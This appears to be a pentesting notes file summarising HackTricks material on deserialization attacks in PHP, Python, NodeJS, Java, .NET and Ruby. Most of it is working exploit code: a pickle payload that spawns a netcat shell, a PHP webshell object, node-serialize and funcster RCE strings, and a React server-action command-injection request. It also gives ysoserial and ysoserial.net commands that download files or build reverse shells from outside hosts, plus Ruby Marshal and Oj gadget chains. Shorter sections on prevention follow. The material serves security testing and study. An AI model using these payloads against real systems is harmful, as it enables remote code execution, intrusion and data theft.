# HackTricks Deserialization - Batch 3: Complete Extracted Techniques

## Source Files Analyzed
- pentesting-web-deserialization.md (1570 lines, 129KB) — ONLY file with real content
- Files 2-10 (PHP, Java, .NET, Python, Python Pickle, NodeJS, Ruby, PHP Autoload, IDOR) — ALL 404 error pages

---

# 1. PHP DESERIALIZATION

## PHP Magic Methods
- `__sleep`: Called during serialization. Returns array of property names to serialize.
- `__wakeup`: Called during deserialization. Reestablishes connections, reinitializes.
- `__unserialize(array $data)`: Called INSTEAD of `__wakeup` if implemented (PHP 7.4+). More control.
- `__destruct`: Called when object is destroyed or script ends. Cleanup tasks.
- `__toString`: Allows object to be treated as string.

### Key: `__wakeup` and `__destruct` fire during `unserialize()` — even if the object is never explicitly used.

## Serializing Referenced Values (PHP)
```php
$o->param1 =& $o->param22;
$o->param = "PARAM";
```
Hash references create shared pointers in serialized data.

## `allowed_classes` Defense (PHP 7.0+)
```php
// SAFE: no classes may be created
$object = unserialize($userControlledData, ['allowed_classes' => false]);

// Granular whitelist
$object = unserialize($userControlledData, ['allowed_classes' => [MyModel::class, DateTime::class]]);
```
On PHP < 7.0, the second argument doesn't exist — always dangerous.

### CVE-2025-52709: Everest Forms WordPress Plugin (≤ 3.2.2)
Wrapper `evf_maybe_unserialize()` checked `version_compare(PHP_VERSION, '7.1.0')` for safe path but fell through to unsafe `unserialize()` on PHP ≤ 7.0.
```php
// Minimal exploit payload
O:8:"SomeClass":1:{s:8:"property";s:28:"<?php system($_GET['cmd']); ?>";}
```
Admin viewing form entry → `__destruct()` fires → RCE.

**Takeaways:**
1. Always pass `['allowed_classes' => false]` to unserialize()
2. Audit defensive wrappers for legacy PHP branches
3. PHP ≥ 7.x alone is NOT sufficient

## PHPGGC (PHP Gadget Chains) - ysoserial for PHP
- Available at: https://github.com/ambionics/phpggc
- Generates payloads for PHP deserialization
- Check `phpinfo()` for installed extensions — abuse external PHP extension code
- Search PHPGGC gadgets for exploitable chains

## phar:// Metadata Deserialization
- If LFI only reads files without executing PHP (file_get_contents, fopen, file, file_exists, md5_file, filemtime, filesize)
- Abuse deserialization occurring when reading files via phar:// protocol
- Craft a PHAR archive with malicious metadata → file operations trigger deserialization

## Laravel Livewire Hydration Chains
- Livewire 3 synthesizers can instantiate arbitrary gadget graphs (with or without APP_KEY)
- Reach Laravel Queueable/SerializableClosure sinks

---

# 2. PYTHON DESERIALIZATION

## Pickle
```python
import pickle, os, base64
class P(object):
    def __reduce__(self):
        return (os.system,("netcat -c '/bin/bash -i' -l -p 1234 ",))
print(base64.b64encode(pickle.dumps(P())))
```
- `__reduce__` method fires on unpickle
- Use `pickle.dumps(P(), 2)` for Python2 compatibility
- For pickle jail escapes: see Python sandbox bypass techniques

## Yaml & jsonpickle
- PyYAML: `yaml.load()` without SafeLoader
- jsonpickle: reconstructs arbitrary Python objects from JSON
- ruamel.yaml: similar deserialization issues
- Tool: can generate RCE payloads for Pickle, PyYAML, jsonpickle, ruamel.yaml

## Class Pollution (Python Prototype Pollution)
- Reference in Python class pollution methodology page
- Can poison class attributes via deserialization

---

# 3. NODEJS DESERIALIZATION

## JS "Magic" Functions
- No automatic magic methods like PHP/Python
- Functions commonly invoked without direct calls: `toString`, `valueOf`, `toJSON`
- If you compromise these via prototype pollution during deserialization → arbitrary code execution
- Async function return poisoning: If returned object from async function is a Promise with a `then` property (function), it executes automatically

```javascript
async function test_resolve() {
  const p = new Promise((resolve) => {
    console.log("hello")
    resolve()
  })
  return p  // p.then is called automatically
}
```

## __proto__ and Prototype Pollution
- Abuse deserialization to pollute `__proto__` or `prototype`
- Link to dedicated prototype pollution page

## node-serialize
Library flag: `_$$ND_FUNC$$_`
```javascript
// Serialize a function
var y = { rce: function() { require("child_process").exec("ls /", function(error, stdout, stderr) { console.log(stdout) }) } }
var serialize = require("node-serialize")
var payload_serialized = serialize.serialize(y)
// Result: {"rce":"_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }) }"}
```

**Exploitation:**
```javascript
// Auto-execute by adding () at end
var test = { rce: "_$$ND_FUNC$$_function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()" }
serialize.unserialize(test)

// Or just raw JS oneliner (no function wrapper)
var test = "{\"rce\":\"_$$ND_FUNC$$_require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) })\"}"
serialize.unserialize(test)
```
- `eval` is used internally to deserialize functions when `_$$ND_FUNC$$_` flag is found
- User input reaches `eval` directly

## funcster
- Standard built-in objects are inaccessible (out of scope)
- `console.log()` or `require()` throw ReferenceError
- **Bypass:** Restore global context via `this.constructor.constructor`

```javascript
// Bypass scope restriction
var desertest2 = { __js_function: 'this.constructor.constructor("console.log(1111)")()' }
funcster.deepDeserialize(desertest2)

var desertest3 = { __js_function: "this.constructor.constructor(\"require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) });\")()" }
funcster.deepDeserialize(desertest3)
```
- Flag: `__js_function`
- Auto-execution: append `()` to function string

## serialize-javascript
- No built-in deserialization; official docs suggest `eval`:
```javascript
function deserialize(serializedJavascript) {
  return eval("(" + serializedJavascript + ")")
}
```
- Directly exploitable:
```javascript
var test = "function(){ require('child_process').exec('ls /', function(error, stdout, stderr) { console.log(stdout) }); }()"
deserialize(test)
```

## Cryo library
- Vulnerable to deserialization attacks
- References: Acunetix blog + HackerOne report #350418

## React Server Components / CVE-2025-55182 (React 19.2.0)
- `react-server-dom-webpack` `decodeAction()` blindly trusts `id` string and `bound` array
- Attacker can invoke ANY exported server action with arbitrary parameters
- No React client needed — any HTTP tool can craft multipart payload

```http
POST /formaction HTTP/1.1
Content-Type: multipart/form-data; boundary=----BOUNDARY

------BOUNDARY
Content-Disposition: form-data; name="$ACTION_REF_0"

------BOUNDARY
Content-Disposition: form-data; name="$ACTION_0:0"

{"id":"app/server-actions#generateReport","bound":["acme","pdf & whoami"]}
------BOUNDARY--
```

```bash
curl -sk -X POST http://target/formaction \
  -F '$ACTION_REF_0=' \
  -F '$ACTION_0:0={"id":"app/server-actions#generateReport","bound":["acme","pdf & whoami"]}'
```

**Gadget:** Any server action wrapping filesystem primitives, DB drivers, or interpreters.
```javascript
async function generateReport(project, format) {
  const cmd = `node ./scripts/report.js --project=${project} --format=${format}`;
  const { stdout } = await pexec(cmd);
  return stdout;
}
// format = "pdf & whoami" → command injection via /bin/sh -c
```

---

# 4. JAVA DESERIALIZATION

## Fingerprints
### White Box
Search for:
- `Serializable` interface implementations
- `java.io.ObjectInputStream`, `readObject`, `readUnshare`
- `XMLDecoder` with user-controlled params
- `XStream.fromXML` (especially ≤ 1.46)
- `readObject`, `readObjectNodData`, `readResolve`, `readExternal`
- `ObjectInputStream.readUnshared`

### Black Box
Magic bytes/signatures:
- Hex: `AC ED 00 05` (Java serialized object)
- Base64: `rO0`
- HTTP header: `Content-type: application/x-java-serialized-object`
- Compressed hex: `1F 8B 08 00`
- Compressed base64: `H4sIA`
- `.faces` extension + `faces.ViewState` parameter: `javax.faces.ViewState=rO0ABXVy...`

## Check if Vulnerable
### White Box
```bash
find . -iname "*commons*collection*"
grep -R InvokeTransformer .
```
Use **gadgetinspector** (https://github.com/JackOfMostTrades/gadgetinspector) for automated gadget chain discovery.

### Black Box
- Burp extension **GadgetProbe**: identifies available libraries and versions (ObjectInputStream focus)
- Burp extension **Java Deserialization Scanner**: identifies and exploits vulnerable libraries via ysoserial
- **Freddy** (NCC Group): detects ObjectInputStream, JSON, YML deserialization issues
- **SerializationDumper**: human-readable serialization format for manual tampering

## Exploitation

## ysoserial (Primary Tool)
- https://github.com/frohoff/ysoserial
- **ysoserial-modified**: supports complex commands with pipes
- Focus: `ObjectInputStream` exploits
- Start with **URLDNS** payload first (safest PoC)

```bash
# DNS probe
java -jar ysoserial-master-SNAPSHOT.jar URLDNS http://xxx.burpcollaborator.net > payload

# Windows RCE examples
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections5 'cmd /c ping -n 5 127.0.0.1' > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c timeout 5" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c echo pwned> C:\\Users\\username\\pwn" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c nslookup xxx.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "cmd /c certutil -urlcache -split -f http://xxx.burpcollaborator.net/a a"
# PS encoded: IEX(New-Object Net.WebClient).downloadString('http://xxx/a')

# Linux RCE examples
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "ping -c 5 192.168.1.4" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "touch /tmp/pwn" > payload
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "dig xxx.burpcollaborator.net"
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "curl xxx.burpcollaborator.net" > payload
# Reverse shell (base64-encoded):
java -jar ysoserial-master-SNAPSHOT.jar CommonsCollections4 "bash -c {echo,YmFzaCAt...}|{base64,-d}|{bash,-i}"
```

### Complete ysoserial Payload List:
BeanShell1, Clojure, CommonsBeanutils1, CommonsCollections1-7, Groovy1, Hibernate1-2, JBossInterceptors1, JRMPClient, JSON1, JavassistWeld1, Jdk7u21, MozillaRhino1-2, Myfaces1-2, ROME, Spring1-2, Vaadin1, Wicket1

### Runtime.exec() Limitations:
Cannot use: `>`, `|`, `$()`, spaces in arguments
Use: http://www.jackson-t.ca/runtime-exec-payloads.html for encoding

### Bulk Payload Generator Script:
```python
payloads = ['BeanShell1', 'Clojure', 'CommonsBeanutils1', 'CommonsCollections1', ...]
for payload in payloads:
    command = os.popen('java -jar ysoserial.jar ' + payload + ' "' + cmd + '"')
    encoded = base64.b64encode(result)
    open(name + '_intruder.txt', 'a').write(encoded + '\n')
```

## SerialKillerBypassGadgets
- https://github.com/pwntester/SerialKillerBypassGadgetCollection
- Works alongside ysoserial for more exploits
- Bypasses SerialKiller library restrictions

## marshalsec
- https://github.com/mbechler/marshalsec
- Generates payloads for JSON and YML serialization libraries in Java
- Requires added dependencies: javax.activation, com.sun.jndi.rmiregistry

## FastJSON
- Java JSON library with deserialization vulnerabilities
- Reference: https://www.alphabot.com/security/blog/2020/java/Fastjson-exceptional-deserialization-vulnerabilities.html

## SignedObject-Gated Deserialization
- `java.security.SignedObject` wraps deserialization with signature validation
- `getObject()` deserializes inner object after validation
- Still exploitable if attacker can obtain valid signature (key compromise or signing oracle)
- Error-handling flows may mint session-bound tokens for unauthenticated users

## JMS (Java Message Service)
- Products: ActiveMQ, WebSphere MQ, HornetQ, etc.
- Send malicious serialized objects to JMS queues/topics
- All consumers that receive the message get infected
- **JMET** tool: https://github.com/matthiaskaiser/jmet — connects and sends serialized exploits

## Java Deserialization Prevention
### Transient objects
```java
private transient double profit; // not serialized
```

### Block deserialization entirely
```java
private final void readObject(ObjectInputStream in) throws java.io.IOException {
    throw new java.io.IOException("Cannot be deserialized");
}
```

### Custom ObjectInputStream (whitelist)
```java
public class LookAheadObjectInputStream extends ObjectInputStream {
    @Override
    protected Class<?> resolveClass(ObjectStreamClass desc) throws IOException, ClassNotFoundException {
        if (!desc.getName().equals(Bicycle.class.getName())) {
            throw new InvalidClassException("Unauthorized deserialization attempt", desc.getName());
        }
        return super.resolveClass(desc);
    }
}
```

### Serialization Filters (Java 9+)
```java
ObjectInputFilter filter = info -> {
    if (info.depth() > MAX_DEPTH) return Status.REJECTED;
    if (info.references() > MAX_REFERENCES) return Status.REJECTED;
    if (info.serialClass() != null && !allowedClasses.contains(info.serialClass().getName())) {
        return Status.REJECTED;
    }
    return Status.ALLOWED;
};
ObjectInputFilter.Config.setSerialFilter(filter);
```

### External Libraries
- **NotSoSerial**: intercepts deserialization to prevent untrusted code
- **jdeserialize**: analyze serialized objects without deserializing
- **Kryo**: alternative serialization with configurable security

---

# 5. .NET DESERIALIZATION

## Fingerprints
### WhiteBox
- `TypeNameHandling`
- `JavaScriptTypeResolver`
- Serializers that allow type determination by user-controlled variable

### BlackBox
- Base64 string: `AAEAAAD/////`
- JSON/XML structures with `TypeObject` or `$type`

## ysoserial.net
- https://github.com/pwntester/ysoserial.net
- Main options: `--gadget`, `--formatter`, `--output`, `--plugin`

```bash
# Ping
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "ping -n 5 10.10.14.44" -o base64

# DNS/HTTP
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "nslookup xxx.burpcollaborator.net" -o base64
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "certutil -urlcache -split -f http://xxx/a a" -o base64

# Reverse shell (base64 PS)
echo -n "IEX(New-Object Net.WebClient).downloadString('http://10.10.14.44/shell.ps1')" | iconv -t UTF-16LE | base64 -w0
ysoserial.exe -g ObjectDataProvider -f Json.Net -c "powershell -EncodedCommand SQBFAFgA..." -o base64
```

### ysoserial.net Additional Parameters
- `--minify`: smaller payload
- `--raf -f Json.Net -c "anything"`: list all gadgets for a formatter
- `--sf xml`: search formatters containing "xml" for a gadget
- `--test`: test exploit locally (reveals which code paths are vulnerable)
- `--plugin`: framework-specific exploits (e.g., ViewState)

### Key .NET Gadgets
- ObjectDataProvider (WPF)
- TypeConfuseDelegate
- ExpandedWrapper
- Json.Net (TypeNameHandling.Auto)

## ViewState Exploitation
- `__ViewState` parameter in .NET
- If server secrets are known → direct RCE

## WSUS BinaryFormatter/SoapFormatter RCE (CVE-2025-59287)
Real-world sink:
- `GetCookie()` → AuthorizationCookie decrypted → BinaryFormatter deserialization
- `ReportEventBatch` → SoapFormatter deserialization when WSUS console ingests event
- RCE as SYSTEM

```powershell
# Reverse shell via BinaryFormatter
ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -o base64 -c "powershell -NoP -W Hidden -Enc <BASE64_PS>"

# Test via SoapFormatter
ysoserial.exe -g TypeConfuseDelegate -f SoapFormatter -o base64 -c "calc.exe"
```
PoC: tecxx/CVE-2025-59287-WSUS

## .NET Prevention
- Avoid data streams defining object types; use `DataContractSerializer` or `XmlSerializer`
- JSON.Net: `TypeNameHandling = TypeNameHandling.None`
- Avoid `JavaScriptSerializer` with `JavaScriptTypeResolver`
- Limit deserializable types
- Beware risky types: `System.IO.FileInfo` (DoS), `ValidationException.Value` (exploitable)
- Custom `SerializationBinder` for `BinaryFormatter` and JSON.Net
- Isolate risky code (e.g., `System.Windows.Data.ObjectDataProvider`) from untrusted data

---

# 6. RUBY DESERIALIZATION

## Marshal (dump/load)
- `Marshal.dump` → serialize to byte stream
- `Marshal.load` → deserialize (vulnerable)
- HMAC used for integrity; keys in: `config/environment.rb`, `config/initializers/secret_token.rb`, `config/secrets.yml`, `/proc/self/environ`

## Ruby 2.X Universal RCE Gadget Chain
```ruby
class Gem::StubSpecification
  def initialize; end
end
stub_specification = Gem::StubSpecification.new
stub_specification.instance_variable_set(:@loaded_from, "|id 1>&2")
# RCE cmd must start with "|" and end with "1>&2"

class Gem::Source::SpecificFile
  def initialize; end
end
specific_file = Gem::Source::SpecificFile.new
specific_file.instance_variable_set(:@spec, stub_specification)
other_specific_file = Gem::Source::SpecificFile.new

$dependency_list = Gem::DependencyList.new
$dependency_list.instance_variable_set(:@specs, [specific_file, other_specific_file])

class Gem::Requirement
  def marshal_dump
    [$dependency_list]
  end
end

payload = Marshal.dump(Gem::Requirement.new)
Marshal.load(payload)  # RCE fires here
```

### Gadget Classes in Real Chains:
`Gem::SpecFetcher`, `Gem::Version`, `Gem::RequestSet::Lockfile`, `Gem::Resolver::GitSpecification`, `Gem::Source::Git`

### Side-effect Marker:
```
*-TmTT="$(id>/tmp/marshal-poc)"any.zip
```

### Where Marshal surfaces:
- Rails cache stores and session stores
- Background job backends
- File-backed object stores
- Custom persistence or transport of binary object blobs

### Ruby 3.4 Universal Chain
- Luke Jahnke's research: https://nastystereo.com/security/ruby-3.4-deserialization.html
- Gem::SafeMarshal escape: https://nastystereo.com/security/ruby-safe-marshal-escape.html

## Ruby `.send()` Method Exploitation
```ruby
# Full control of method name and args → RCE
<Object>.send('eval', '<ruby code>') == RCE

# Only method name controlled → call any no-arg or default-arg method
<Object>.send('<user_input>')

# Enumerate candidate methods
candidate_methods = repo_methods.select do |method_name|
  [0, -1].include?(repo.method(method_name).arity())
end
# From 5542 methods → 3595 candidates
```

## Ruby Class Pollution
- Pollute Ruby class via deserialization

## Ruby _json Pollution
- Non-hashable body values (arrays) added to `_json` key
- Attacker can set `_json` directly to arbitrary values
- Authorization bypass if app checks one param but uses `_json` for actions

## Ruby Serialization Libraries Table

| Library        | Input  | Kick-off method                |
|----------------|--------|--------------------------------|
| Marshal (Ruby) | Binary | `_load`                        |
| Oj             | JSON   | `hash` (class as hash key)     |
| Ox             | XML    | `hash` (class as hash key)     |
| Psych (Ruby)   | YAML   | `hash` or `init_with`          |
| JSON (Ruby)    | JSON   | `json_create`                  |

### Oj Exploitation:
```ruby
class SimpleClass
  def initialize(cmd)
    @cmd = cmd
  end
  def hash
    system(@cmd)
  end
end
simple = SimpleClass.new("open -a calculator")
json_payload = Oj.dump(simple)
Oj.load(json_payload)  # RCE via hash()
```

### Oj Gadget Chain (DNS probe → RCE):
```json
{
  "^o": "URI::HTTP",
  "scheme": "s3",
  "host": "example.org/anyurl?",
  "port": "anyport",
  "path": "/",
  "user": "anyuser",
  "password": "anypw"
}
```

### Full RCE via Oj:
```json
{
  "^o": "Gem::Resolver::SpecSpecification",
  "spec": {
    "^o": "Gem::Resolver::GitSpecification",
    "source": {
      "^o": "Gem::Source::Git",
      "git": "zip",
      "reference": "-TmTT=\"$(id>/tmp/anyexec)\"",
      "root_dir": "/tmp",
      "repository": "anyrepo",
      "name": "anyname"
    },
    "spec": {
      "^o": "Gem::Resolver::Specification",
      "name": "name",
      "dependencies": []
    }
  }
}
```

## Bootstrap Caching → RCE (Rails)
- Arbitrary file write → Bootsnap cache poisoning
- Write malicious compiled Ruby code cache file under `tmp/cache/bootsnap/compile-cache-iseq/`
- Use FNV-1a 64-bit hash to compute correct cache path
- Craft cache key header with correct RUBY_VERSION, RUBY_REVISION, size, mtime, compile_option
- Write to `tmp/restart.txt` to trigger Puma restart
- During restart, malicious cache loaded → RCE

## Ruby Marshal Exploitation (Updated)
- Treat any `Marshal.load`/`marshal_load` as RCE sink
- Gadget discovery:
  - Grep for constructors, `hash`, `_load`, `init_with`, side-effectful methods
  - CodeQL Ruby unsafe deserialization queries
  - Validate with multi-format PoCs (JSON/XML/YAML/Marshal)

### Minimal Vulnerable Rails Controller:
```ruby
class UserRestoreController < ApplicationController
  def show
    user_data = params[:data]
    if user_data.present?
      deserialized_user = Marshal.load(Base64.decode64(user_data))
      render plain: "OK: #{deserialized_user.inspect}"
    end
  end
end
```

---

# 7. JNDI INJECTION & Log4Shell
- JNDI Injection via RMI, CORBA, LDAP
- Log4Shell exploitation
- See: JNDI - Java Naming and Directory Interface & Log4Shell page

---

# CRITICAL CROSS-LANGUAGE SUMMARY

## Detection by Magic Bytes/Signatures
| Language | Signature |
|----------|-----------|
| Java     | hex: `AC ED 00 05`, base64: `rO0` |
| Java (gzip) | hex: `1F 8B 08 00`, base64: `H4sIA` |
| .NET     | base64: `AAEAAAD/////` |
| PHP      | Serialized: `O:`, `a:`, `s:`, `i:`, `b:`, `d:` |
| Python   | Pickle protocol markers (varies by protocol version) |
| NodeJS   | `_$$ND_FUNC$$_` (node-serialize), `__js_function` (funcster) |
| Ruby     | Binary Marshal format |

## Primary Exploitation Tools
| Language | Tool |
|----------|------|
| PHP      | PHPGGC (https://github.com/ambionics/phpggc) |
| Java     | ysoserial (https://github.com/frohoff/ysoserial) |
| Java JSON/YML | marshalsec (https://github.com/mbechler/marshalsec) |
| .NET     | ysoserial.net (https://github.com/pwntester/ysoserial.net) |
| Java JMS | JMET (https://github.com/matthiaskaiser/jmet) |
| Java     | gadgetinspector, SerializationDumper, Freddy, GadgetProbe |

## Methodology
1. Identify serialization format via magic bytes or content-type
2. Fingerprint available libraries/gadgets (GadgetProbe, Freddy, phpinfo, dependency analysis)
3. Test with DNS/URL callbacks first (URLDNS for Java, ping/nslookup/curl for others)
4. Escalate to RCE with appropriate gadget chain
5. For blind deserialization: use timing-based or out-of-band techniques

## Prevention Patterns
- **Never** deserialize user-controlled data without strict class whitelisting
- Use `allowed_classes` (PHP), `ObjectInputFilter` (Java), `SerializationBinder` (.NET), Safe loaders (Python YAML safe_load)
- Prefer data-only formats (JSON, Protocol Buffers) over native serialization
- Apply depth/reference limits during deserialization
- Keep libraries patched — new gadgets discovered regularly
